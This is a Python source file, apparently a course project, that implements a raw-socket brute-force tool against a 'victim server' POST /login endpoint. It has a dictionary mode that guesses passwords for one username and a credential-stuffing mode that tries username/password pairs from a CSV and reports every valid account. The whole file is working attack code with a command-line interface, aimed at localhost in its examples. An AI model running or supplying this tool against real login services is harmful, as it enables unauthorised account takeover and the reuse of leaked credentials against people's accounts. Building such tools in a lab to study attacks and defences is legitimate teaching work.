"""
attack_tool.py — custom brute-force attacker (raw sockets only).

Part 2 of the project. This tool performs online password-guessing attacks
against the victim server's POST /login endpoint.

HARD CONSTRAINT: no high-level HTTP libraries. Every HTTP request is built by
hand as a byte string and sent over a raw TCP socket (the `socket` module).
The only imports are the standard library `socket`, `argparse`, `sys`, `time`.

Currently implemented modes:
  * dictionary : try many passwords against ONE username, stop on first
                 success.
  * known      : try a provided list of (username, password) pairs read from a
                 CSV (`username,password[,source]`, e.g. all_credentials.csv)
                 and report every account whose password matches (credential
                 stuffing). Continues after a success so ALL valid accounts are
                 found.

Usage:
  python attack_tool.py --target 127.0.0.1 --port 8080 --mode dictionary \
      --username admin --wordlist wordlist.txt
  # for a rank,password CSV (like 10millionPasswords.csv) add --csv:
  python attack_tool.py --target 127.0.0.1 --mode dictionary \
      --username admin --wordlist 10millionPasswords.csv --csv

  # known password mode: username,password CSV (extra columns ignored)
  python attack_tool.py --target 127.0.0.1 --port 8080 --mode known \
      --credentials all_credentials.csv
"""

import argparse
import socket
import sys
import time

# --- Configuration -----------------------------------------------------------

SOCKET_TIMEOUT = 5.0  # seconds; keeps a hung server from freezing the attack
RECV_CHUNK = 4096     # bytes to read per recv() call


# --- 1. url_encode -----------------------------------------------------------

# Characters that are safe to send unescaped in a form body. Everything else is
# percent-encoded as %XX. RFC 3986 "unreserved" set: letters, digits, - _ . ~
_UNRESERVED = set(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "-_.~"
)


def url_encode(value: str) -> str:
    """
    Percent-encode a string for an application/x-www-form-urlencoded body.

    Reserved/unsafe characters (@, &, =, space, +, %, etc.) become %XX using
    their UTF-8 byte values, so the body never breaks the username/password
    boundaries. Implemented by hand — no urllib.
    """
    encoded_chars = []
    for byte in value.encode("utf-8"):
        char = chr(byte)
        if char in _UNRESERVED:
            encoded_chars.append(char)
        else:
            encoded_chars.append("%%%02X" % byte)
    return "".join(encoded_chars)


# --- 2. craft_packet ---------------------------------------------------------

def craft_packet(host: str, username: str, password: str) -> bytes:
    """
    Build a raw HTTP POST /login request as bytes.

    Content-Length is computed as the EXACT byte length of the encoded body,
    which is what makes the server read the body correctly.
    """
    body = "username=%s&password=%s" % (url_encode(username), url_encode(password))
    body_bytes = body.encode("utf-8")

    # Headers, joined with CRLF. A blank line separates headers from the body.
    request_lines = [
        "POST /login HTTP/1.1",
        "Host: %s" % host,
        "User-Agent: Mozilla/5.0",
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Length: %d" % len(body_bytes),
        "Connection: close",
        "",
        "",  # trailing empty -> the blank line that ends the headers
    ]
    header_bytes = "\r\n".join(request_lines).encode("utf-8")
    return header_bytes + body_bytes


# --- 3. send_packet ----------------------------------------------------------

def send_packet(target: str, port: int, raw_bytes: bytes) -> str:
    """
    Send raw_bytes over a fresh TCP socket and return the full response text.

    Uses Connection: close semantics — we read until the server closes the
    connection (recv returns b""). Raises socket.error / OSError on failure,
    which the caller handles per-attempt.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(SOCKET_TIMEOUT)
    try:
        sock.connect((target, port))
        sock.sendall(raw_bytes)

        chunks = []
        while True:
            data = sock.recv(RECV_CHUNK)
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()


# --- 4. parse_response -------------------------------------------------------

def parse_response(response: str) -> bool:
    """
    Return True only on a clear success signal.

    Success = status line contains '200' AND the body contains 'Welcome'.
    A 401 / 'Invalid' response is treated as failure. An empty or malformed
    response is also failure.
    """
    if not response:
        return False

    # The status line is the first line, e.g. "HTTP/1.1 200 OK".
    status_line = response.split("\r\n", 1)[0]
    status_ok = " 200 " in status_line or status_line.endswith(" 200")

    # The body follows the first blank line (CRLFCRLF).
    parts = response.split("\r\n\r\n", 1)
    body = parts[1] if len(parts) > 1 else ""
    body_ok = "Welcome" in body

    return status_ok and body_ok


# --- 5. log_result -----------------------------------------------------------

def log_result(username: str, password: str, success: bool) -> None:
    """Print one line describing an attempt to stdout."""
    tag = "[+]" if success else "[-]"
    outcome = "SUCCESS" if success else "FAIL"
    print("%s %s : %-20s -> %s" % (tag, username, password, outcome))


# --- Wordlist reading --------------------------------------------------------

def iter_wordlist(path: str, is_csv: bool):
    """
    Yield candidate passwords from the wordlist file, one at a time (streaming).

    Streaming means we never load the whole file into memory and we can stop the
    moment we find a hit.

    Plain mode : each line is one password.
    CSV mode   : each line is 'rank,password'; skip the header row and take
                 everything after the FIRST comma (so passwords with commas work).
    """
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        first = True
        for line in f:
            line = line.rstrip("\n").rstrip("\r")
            if is_csv:
                if first:
                    first = False
                    # Skip a header like "rank,password".
                    if line.lower().startswith("rank,"):
                        continue
                if "," not in line:
                    continue
                password = line.split(",", 1)[1]
            else:
                password = line
            if password == "":
                continue
            yield password


# --- Known username/password pair reading ------------------------------------

# Header names we accept for the two meaningful CSV columns.
_USERNAME_HEADERS = {"username", "user", "user_name", "userid", "login", "name"}
_PASSWORD_HEADERS = {"password", "pass", "passwd", "passwords"}


def parse_csv_line(line: str):
    """
    Split one CSV line into fields, honoring double-quoted fields (so a password
    containing a comma still parses correctly). No csv module needed.
    """
    fields, current, in_quotes, i = [], [], False, 0
    while i < len(line):
        ch = line[i]
        if in_quotes:
            if ch == '"':
                if i + 1 < len(line) and line[i + 1] == '"':
                    current.append('"')
                    i += 2
                    continue
                in_quotes = False
            else:
                current.append(ch)
        elif ch == '"':
            in_quotes = True
        elif ch == ",":
            fields.append("".join(current))
            current = []
        else:
            current.append(ch)
        i += 1
    fields.append("".join(current))
    return fields


def iter_known_pairs(path: str):
    """
    Yield (username, password) pairs from a CSV file, streaming.

    Expects a `username,password[,source]` CSV such as all_credentials.csv. A
    header row is detected and skipped, extra columns are ignored, and passwords
    with quoted commas are handled. Blank/short rows are skipped.
    """
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        lines = [ln.rstrip("\n").rstrip("\r") for ln in f]
    lines = [ln for ln in lines if ln != ""]
    if not lines:
        return

    # Locate the username/password columns (default to the first two).
    user_idx, pass_idx = 0, 1
    lowered = [field.strip().lower() for field in parse_csv_line(lines[0])]
    if any(f in _USERNAME_HEADERS for f in lowered) or any(
        f in _PASSWORD_HEADERS for f in lowered
    ):
        for idx, name in enumerate(lowered):
            if name in _USERNAME_HEADERS:
                user_idx = idx
            elif name in _PASSWORD_HEADERS:
                pass_idx = idx
        lines = lines[1:]  # drop the header row

    for line in lines:
        fields = parse_csv_line(line)
        if len(fields) <= max(user_idx, pass_idx):
            continue
        yield fields[user_idx].strip(), fields[pass_idx].strip()


# --- Known-password attack ---------------------------------------------------

def known_password_attack(target, port, host_header, pairs):
    """
    Known-password (credential-stuffing) attack.

    Unlike the dictionary attack — which guesses many passwords for a single
    username — this tries a provided list of known (username, password) pairs
    and reports every account whose password matches. It always continues after
    a hit, so ALL valid accounts are found.

    `pairs` is any iterable of (username, password) tuples, e.g. the generator
    returned by iter_known_pairs(). Returns the list of valid pairs.
    """
    pairs = list(pairs)  # small file; lets us report "found X out of Y"
    print("[*] Known-password attack against %s:%d" % (target, port))
    print("[*] Credentials: %d pair(s) to try" % len(pairs))
    print("-" * 60)

    attempts = 0
    hits = []
    start = time.time()

    for username, password in pairs:
        attempts += 1
        packet = craft_packet(host_header, username, password)
        try:
            response = send_packet(target, port, packet)
        except (socket.timeout, OSError) as exc:
            # Connection error on this attempt — report and keep going.
            print("[!] %s : %-20s -> ERROR (%s)" % (username, password, exc))
            continue

        success = parse_response(response)
        log_result(username, password, success)

        if success:
            hits.append((username, password))

    elapsed = time.time() - start

    print("-" * 60)
    print("[*] Valid accounts found: %d out of %d" % (len(hits), len(pairs)))
    if hits:
        print("[+] Working credentials:")
        for username, password in hits:
            print("    %s : %s" % (username, password))
    else:
        print("[-] No valid credentials found.")
    print("[*] Attempts: %d | Time: %.2fs" % (attempts, elapsed))
    return hits


# --- Dictionary attack -------------------------------------------------------

def dictionary_attack(target, port, host_header, username, wordlist_path, is_csv):
    """
    Try each password in the wordlist against a single username.

    Stops on the first success and prints a summary.
    """
    print("[*] Dictionary attack on user '%s' against %s:%d" % (username, target, port))
    print("[*] Wordlist: %s%s" % (wordlist_path, " (CSV)" if is_csv else ""))
    print("-" * 60)

    attempts = 0
    found_password = None
    start = time.time()

    for password in iter_wordlist(wordlist_path, is_csv):
        attempts += 1
        packet = craft_packet(host_header, username, password)
        try:
            response = send_packet(target, port, packet)
        except (socket.timeout, OSError) as exc:
            # Connection error on this attempt — report and keep going.
            print("[!] %s : %-20s -> ERROR (%s)" % (username, password, exc))
            continue

        success = parse_response(response)
        log_result(username, password, success)

        if success:
            found_password = password
            break

    elapsed = time.time() - start

    print("-" * 60)
    if found_password is not None:
        print("[+] PASSWORD FOUND: %s : %s" % (username, found_password))
    else:
        print("[-] Password not found for '%s' (wordlist exhausted)." % username)
    print("[*] Attempts: %d | Time: %.2fs" % (attempts, elapsed))
    return found_password is not None


# --- CLI ---------------------------------------------------------------------

def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Custom raw-socket brute-force attacker (dictionary and known password modes)."
    )
    parser.add_argument("--target", required=True, help="target IP/host")
    parser.add_argument("--port", type=int, default=8080, help="target port (default 8080)")
    parser.add_argument("--mode", required=True, choices=["dictionary", "known"],
                        help="attack mode")
    parser.add_argument("--username", help="username to attack (dictionary mode)")
    parser.add_argument("--wordlist", default="wordlist.txt",
                        help="path to the password wordlist (default wordlist.txt)")
    parser.add_argument("--csv", action="store_true",
                        help="wordlist is a 'rank,password' CSV with a header")
    parser.add_argument("--credentials", default="all_credentials.csv",
                        help="known mode: username,password CSV "
                             "(default all_credentials.csv)")
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    if args.mode == "dictionary":
        if not args.username:
            print("error: --username is required for dictionary mode", file=sys.stderr)
            return 2
        # The Host header uses the target as given; that's what the server sees.
        found = dictionary_attack(
            args.target, args.port, args.target,
            args.username, args.wordlist, args.csv,
        )
        return 0 if found else 1

    if args.mode == "known":
        try:
            with open(args.credentials, "r", encoding="utf-8", errors="replace"):
                pass
        except OSError:
            print("error: credentials file not found: %s" % args.credentials,
                  file=sys.stderr)
            return 2
        hits = known_password_attack(
            args.target, args.port, args.target,
            iter_known_pairs(args.credentials),
        )
        return 0 if hits else 1

    return 2


if __name__ == "__main__":
    sys.exit(main())
